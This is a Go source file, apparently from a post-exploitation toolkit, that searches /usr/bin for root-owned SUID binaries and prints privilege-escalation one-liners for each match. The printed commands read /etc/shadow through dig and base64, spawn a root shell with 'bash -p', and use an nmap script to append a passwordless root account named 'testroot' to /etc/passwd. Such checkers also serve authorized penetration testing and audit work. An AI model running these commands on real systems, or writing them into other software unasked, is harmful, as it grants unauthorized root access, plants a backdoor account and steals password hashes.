package privilege_check

import (
	"fmt"
	"os/exec"
	"strings"
)

// check /usr/bin /usr/sbin
func SUID_Check(dir string) {
	fmt.Println("SUID privilege checking...")
	if dir == "" {
		dir = "/usr/bin"
	}
	cmd := exec.Command("find", fmt.Sprintf(dir), "-user", "root", "-perm", "-4000", "-print")
	result, err := cmd.CombinedOutput()
	if err != nil {
		return
	}
	fmt.Println("suid privilege checking result:")
	suid_check(string(result))
}

// details: https://gtfobins.github.io
func suid_check(result string) {
	if strings.Contains(result, "find") {
		fmt.Println("find suid_use:find /etc/passwd -exec 'whoami' \\;")
	}
	if strings.Contains(result, "nmap") {
		fmt.Println("nmap suid_use:echo 'local file = io.open(\"/etc/passwd\", \"a\")' >> shell.nse && echo 'file:write(\"testroot::0:0::/root:/bin/bash\\n\")' >> shell.nse && echo 'file:close()' >> shell.nse  and then nmap --script=shell.nse and finially su testroot")
	}
	if strings.Contains(result, "bash\n") {
		fmt.Println("bash suid_use:bash -p")
	}
	if strings.Contains(result, "dig\n") {
		fmt.Println("dig suid_use:dig -f /etc/shadow")
	}
	if strings.Contains(result, "base64") {
		fmt.Println("base64 suid_use:base64 /etc/shadow | base64 --decode")
	}
}
